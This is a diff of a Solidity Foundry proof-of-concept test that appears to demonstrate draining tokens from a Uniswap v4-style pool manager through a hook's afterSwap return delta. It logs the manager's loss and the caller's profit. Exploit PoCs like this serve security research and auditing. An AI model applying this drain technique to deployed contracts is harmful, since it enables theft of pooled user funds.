@@ -61,20 +61,28 @@ contract POC is Test {
             BalanceDelta sDelta = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
             int128 s0 = sDelta.amount0();
             int128 s1 = sDelta.amount1();
+            console.logInt(s0);
+            console.logInt(s1);
+            // settle what we owe
             if (s0 < 0) { manager.sync(c0); token0.transfer(address(manager), uint128(-s0)); manager.settle(); }
             if (s1 < 0) { manager.sync(c1); token1.transfer(address(manager), uint128(-s1)); manager.settle(); }
+            // take what pool owes - this ALREADY includes the 10e18 hook exploit
             if (s0 > 0) manager.take(c0, address(this), uint128(s0));
             if (s1 > 0) manager.take(c1, address(this), uint128(s1));
-            manager.take(c1, address(this), 10e18);
         }
         return "";
     }
 
     function test_afterSwapReturnDelta() public {
         uint bBefore=token1.balanceOf(address(manager));
+        uint myBefore=token1.balanceOf(address(this));
         manager.unlock("");
         uint bAfter=token1.balanceOf(address(manager));
-        console.log("Loss",bBefore-bAfter);
-        assertLt(bAfter,bBefore);
+        uint myAfter=token1.balanceOf(address(this));
+        console.log("Manager before", bBefore);
+        console.log("Manager after", bAfter);
+        console.log("Loss", bBefore - bAfter);
+        console.log("My profit", myAfter - myBefore);
+        assertLt(bAfter, bBefore);
     }
 }
